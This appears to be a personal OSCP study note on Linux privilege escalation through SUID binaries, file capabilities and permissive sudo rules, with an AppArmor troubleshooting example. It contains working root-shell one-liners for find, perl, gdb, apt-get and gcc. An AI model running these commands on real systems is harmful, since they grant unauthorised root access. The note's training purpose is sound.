---
aliases:
  - Insecure System Components
tags:
  - tech
  - cybsec
  - offensive_security
  - offsec
  - oscp
  - linux
  - enumeration
  - enum
  - automated
  - privesc
  - privilege_escalation
  - password
  - system_components
  - suid
  - sudo
  - kernel_exploit
author: Mehdi N Tehrani
creat_date: 2024-01-01
category: Cyber Security
subcategory: Offensive Security - OSCP
---

# Abusing setuid binaries and capabilities
## SUID
Let's examine a running process e.g. `passwd`
```sh
ps u -C passwd
#  ^ user-oriented format
#     ^ command name

grep Uid /proc/<pid>/status
Uid:    1000    0       0       0
#       ^ real uid
#               ^ effective uid
#                       ^ saved set uid
#                               ^ file system uid
               
```
https://man7.org/linux/man-pages/man5/proc.5.html

For example if the `find` command has suid set, we can run the following command to abuse it:
https://gtfobins.github.io/gtfobins/find/#suid
```
./find . -exec "/bin/bash" -p \; -quit
```


## Capabilities
#capabilities
Even though they seem similar, *capabilities*, *setuid*, and the *setuid flag* are located in different places within the Linux ELF file format.

```sh
/usr/sbin/getcap -r / 2>/dev/null
```
example output:
```
/usr/bin/ping = cap_net_raw+ep
/usr/bin/perl = cap_setuid+ep
/usr/bin/perl5.28.1 = cap_setuid+ep
/usr/bin/gnome-keyring-daemon = cap_ipc_lock+ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
```
`+ep`: effective / permitted

### perl
#perl
to set `ep` capabilities for `perl`
```
sudo setcap cap_setuid+ep perl
```
To abuse capabilities of `perl`:
https://gtfobins.github.io/gtfobins/perl/#capabilities
```sh
./perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'
```

### gdb
#gdb
To abuse capabilities of `gdb `: 
https://gtfobins.github.io/gtfobins/gdb/#capabilities
```sh
gdb -nx -ex 'python import os; os.setuid(0)' -ex '!sh' -ex quit
```

## sudo
[sudo](https://man7.org/linux/man-pages/man8/sudo.8.html)
[sudoers](https://man7.org/linux/man-pages/man5/sudoers.5.html)
If the `/etc/sudoers` configurations are too permissive, a user could abuse the short-lived administrative right to obtain permanent root access. 

### troubleshooting
#app_armor #apparmor #mac #mandatory_access_control #audit_daemon
If we try abusing `tcpdump` using sudo but it still fails, we can further investigate it:
```sh
cat /var/log/syslog | grep tcpdump

Aug 29 02:52:14 debian-privesc kernel: [ 5742.171462] audit: type=1400 audit(1661759534.607:27): apparmor="DENIED" operation="exec" profile="/usr/sbin/tcpdump" name="/tmp/tmp.c5hrJ5UrsF" pid=12280 comm="tcpdump" requested_mask="x" denied_mask="x" fsuid=0 ouid=1000
```
[audit](https://man7.org/linux/man-pages/man8/auditd.8.html) daemon has logged our privilege escalation attempt. Closer inspection reveals that [AppArmor](https://apparmor.net/) was triggered and blocked us. AppArmor is a **kernel module** that provides **mandatory access control** (**MAC**) on Linux systems by running various *application-specific profiles*, and it's enabled by default on Debian 10. 

We can verify AppArmor's status as the root user using the `aa-status` command. #aa_status
```sh
aa-status

apparmor module is loaded.
20 profiles are loaded.
18 profiles are in enforce mode.
   /usr/bin/evince
   /usr/bin/evince-previewer
   /usr/bin/evince-previewer//sanitized_helper
   /usr/bin/evince-thumbnailer
   /usr/bin/evince//sanitized_helper
   /usr/bin/man
   /usr/lib/cups/backend/cups-pdf
   /usr/sbin/cups-browsed
   /usr/sbin/cupsd
   /usr/sbin/cupsd//third_party
   /usr/sbin/tcpdump
```

#sudo #apt_get #apt-get
https://gtfobins.github.io/gtfobins/apt-get/#sudo
```sh
sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
```

### gcc
#gcc #sudo 
```sh
sudo gcc -wrapper /bin/sh,-s .
```


# Kernel Exploits
#kernel_exploits #kernel #exploit #architecture #arch #uname
```
cat /etc/issue
uname -a
arch
```

